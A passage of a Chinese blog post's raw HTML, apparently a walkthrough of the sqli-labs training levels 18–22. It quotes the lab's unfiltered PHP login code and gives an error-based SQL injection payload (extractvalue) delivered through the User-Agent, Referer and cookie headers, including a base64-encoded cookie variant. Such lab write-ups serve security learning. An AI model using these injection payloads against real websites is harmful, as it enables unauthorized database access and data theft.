users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result1</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row1</span> = mysql_fetch_array(<span class="variable">$result1</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">			mysql_query(<span class="variable">$insert</span>);</span><br><span class="line">			<span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			print_r(mysql_error());			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">			&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到源码对于ua，ip这些是没有过滤的，所以我们可以通过修改包头来进行报错注入，由于这里我们直接看源码，所以我们可以闭合几个引号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205061718.png"></p>
+<p>或者是使用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>都可以</p>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>和18关一样，改成Referer就行</p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>源码的意思是只要登录过，第二次刷新直接用cookie里面的username来执行sql语句，由于cookie没有函数进行过滤，所以我们对cookie进行报错函数的注入即可，由于没有找到好用的插件，所以直接上bp了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205073320.png"></p>
+<h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>对cookie进行了base64加密，把上一关的cookie加个base64就行</p>
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>同21</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Kenoeee</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/06/sqlI_labs%2001/">http://example.com/2022/02/06/sqlI_labs%2001/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Kenoeee</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">-web</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/01/30/PHP%20Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/4.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP Session反序列化漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/30/PHP%20Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP Session反序列化漏洞"><img class="cover" src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/4.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-30</div><div class="title">PHP Session反序列化漏洞</div></div></a></div><div><a href="/2022/01/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" title="php反序列化字符逃逸"><img class="cover" src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/7_高清放大.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-28</div><div class="title">php反序列化字符逃逸</div></div></a></div><div><a href="/2022/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="反序列化漏洞"><img class="cover" src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-27</div><div class="title">反序列化漏洞</div></div></a></div><div><a href="/2022/01/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集"><img class="cover" src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-10</div><div class="title">信息收集</div></div></a></div><div><a href="/2021/09/09/SQL%E6%B3%A8%E5%85%A5/" title="sql注入"><img class="cover" src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/2.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-09</div><div class="title">sql注入</div></div></a></div><div><a href="/2022/01/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="任意文件包含"><img class="cover" src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-26</div><div class="title">任意文件包含</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/20220128021634.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Kenoeee</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labsLess0-22"><span class="toc-number">1.</span> <span class="toc-text">Sqli_labsLess0-22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">sql注入的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1"><span class="toc-number">1.3.</span> <span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">1.3.2.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">1.3.3.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">1.3.4.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">1.3.5.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">1.3.6.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">1.3.7.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.8.</span> <span class="toc-text">常见报错函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.3.8.4.</span> <span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#geometrycollection"><span class="toc-number">1.3.8.5.</span> <span class="toc-text">geometrycollection()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipoint"><span class="toc-number">1.3.8.6.</span> <span class="toc-text">multipoint ()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#polygon"><span class="toc-number">1.3.8.7.</span> <span class="toc-text">polygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipolygon"><span class="toc-number">1.3.8.8.</span> <span class="toc-text">multipolygon()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linestring"><span class="toc-number">1.3.8.9.</span> <span class="toc-text">linestring()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multilinestring"><span class="toc-number">1.3.8.10.</span> <span class="toc-text">multilinestring()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">1.3.9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.10.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">1.3.11.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.3.12.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">1.3.13.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">1.3.14.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">1.3.15.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">1.3.16.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">1.3.17.</span> <span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">1.3.18.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">1.3.19.</span> <span class="toc-text">Less-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">1.3.20.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">1.3.21.</span> <span class="toc-text">Less-20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.3.22.</span> <span class="toc-text">Less-21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">1.3.23.</span> <span class="toc-text">Less-22</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/06/sqlI_labs%2001/" title="sqli_labs less0-22"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqli_labs less0-22"/></a><div class="content"><a class="title" href="/2022/02/06/sqlI_labs%2001/" title="sqli_labs less0-22">sqli_labs less0-22</a><time datetime="2022-02-05T16:00:00.000Z" title="发表于 2022-02-06 00:00:00">2022-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/30/PHP%20Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP Session反序列化漏洞"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/4.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP Session反序列化漏洞"/></a><div class="content"><a class="title" href="/2022/01/30/PHP%20Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP Session反序列化漏洞">PHP Session反序列化漏洞</a><time datetime="2022-01-29T16:00:00.000Z" title="发表于 2022-01-30 00:00:00">2022-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" title="php反序列化字符逃逸"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/7_高清放大.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化字符逃逸"/></a><div class="content"><a class="title" href="/2022/01/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" title="php反序列化字符逃逸">php反序列化字符逃逸</a><time datetime="2022-01-27T17:35:57.960Z" title="发表于 2022-01-28 01:35:57">2022-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/28/misc%E5%85%A5%E9%97%A8/" title="misc基本工具和思路总结"><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/6_高清放大.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="misc基本工具和思路总结"/></a><div class="content"><a class="title" href="/2022/01/28/misc%E5%85%A5%E9%97%A8/" title="misc基本工具和思路总结">misc基本工具和思路总结</a><time datetime="2022-01-27T17:35:57.948Z" title="发表于 2022-01-28 01:35:57">2022-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="反序列化漏洞"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化漏洞"/></a><div class="content"><a class="title" href="/2022/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="反序列化漏洞">反序列化漏洞</a><time datetime="2022-01-26T16:00:00.000Z" title="发表于 2022-01-27 00:00:00">2022-01-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Kenoeee</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
